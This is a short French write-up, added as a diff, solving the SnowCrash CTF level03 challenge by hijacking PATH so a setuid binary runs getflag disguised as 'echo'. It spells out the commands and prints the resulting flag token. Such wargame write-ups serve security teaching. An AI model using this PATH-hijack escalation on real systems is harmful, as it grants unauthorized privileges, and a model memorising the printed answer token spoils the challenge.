@@ -1,0 +1,16 @@
+Il y a un executable nomme level03. Lorsqu'on le lance, on voit apparaitre: "Exploit me"
+avec un strings level03 on voit echo Exploit me.
+On creer donc un dossier dans /tmp, on va dedans, puis "which getflag" qui nous donne l'endroit ou se trouve getflag.
+
+On le copie donc dans notre repertoire en le renommant en echo:
+level03@SnowCrash:/tmp/tettouat$ cp /bin/getflag echo
+
+puis on mets notre repertoire dans notre PATH, en premier:
+level03@SnowCrash:/tmp/tettouat$ export PATH=/tmp/tettouat:$PATH
+
+Et on relance l'executable qui prendra notre getflag renommer en echo pour la fonction echo et l'executera avec les droits de flag03:
+level03@SnowCrash:/tmp/tettouat$ ~/level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+Voila!
+
